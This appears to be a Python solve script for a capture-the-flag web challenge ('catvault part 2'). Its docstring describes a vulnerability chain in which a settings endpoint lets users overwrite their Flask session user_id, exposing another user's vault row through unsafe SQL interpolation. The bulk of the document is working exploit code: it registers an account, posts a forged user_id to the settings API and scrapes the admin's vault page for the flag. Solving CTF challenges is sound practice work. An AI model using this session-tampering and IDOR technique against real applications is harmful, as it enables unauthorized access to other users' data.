#!/usr/bin/env python3
"""
catvault - part 2 (L3akCTF 2026) — offline PoC

Vuln chain (reconstructed from source, remote is DEAD — do not run against it):

  1. POST /api/settings  (JSON) writes ARBITRARY keys into the Flask session
     (only keys starting with "_" and non-string values are skipped,
     app.py:121-132).  In particular session["user_id"] is writable.
  2. db.get_vault_entries() interpolates the session user_id straight into SQL:
         SELECT id, content FROM vault WHERE id = {user_id};
     (db.py:57-60)  ->  session user_id => SQLi / IDOR.
  3. The REAL part-2 flag lives in the DB: db.create_admin() inserts the FLAG
     env var as the vault row of user 'admin' (db.py:26-31).  That row always
     gets id = 1 (first AUTO_INCREMENT row in a fresh table).
  4. So: register -> overwrite session user_id with "1" -> GET /vault renders
     admin vault row id=1 -> flag2 is printed.

Flag 2 == FLAG env (DB), NOT /flag.txt (that file is a decoy:
"this_challenge_is_impossible_i_put_it_here_as_a_test_to_waste_your_time...").

Usage:
    python solve.py [BASE_URL]
    (default: $CHALL_URL or http://127.0.0.1:5098 — docker-compose mapped port)
"""

import os
import re
import sys
import uuid

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1
        else os.environ.get("CHALL_URL", "http://127.0.0.1:5098"))

FLAG_RE = re.compile(r"L3AK\{[^}]+\}")


def main() -> int:
    s = requests.Session()
    s.headers["User-Agent"] = "catvault-poc"

    # 1) get a valid session (any user) — required by /api/settings auth check
    uname = f"pwn{uuid.uuid4().hex[:10]}"
    r = s.post(
        f"{BASE}/register",
        data={"username": uname, "password": "meow"},
        allow_redirects=False,
    )
    assert r.status_code in (302, 303), f"register failed: {r.status_code}"
    assert "user_id" in s.cookies or r.headers.get("Set-Cookie"), "no session cookie"

    # 2) overwrite session["user_id"] -> "1" (admin vault row id)
    r = s.post(f"{BASE}/api/settings", json={"user_id": "1"})
    assert r.ok, f"/api/settings failed: {r.status_code} {r.text[:200]}"
    assert r.json().get("saved", {}).get("user_id") == "1", r.text[:200]

    # 3) render the vault as user_id=1 -> admin's vault entry == flag2
    r = s.get(f"{BASE}/vault")
    assert r.ok, f"/vault failed: {r.status_code}"
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] flag2 = {m.group(0)}")
        return 0
    print(f"[-] flag not rendered. Response snippet:\n{r.text[:500]}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
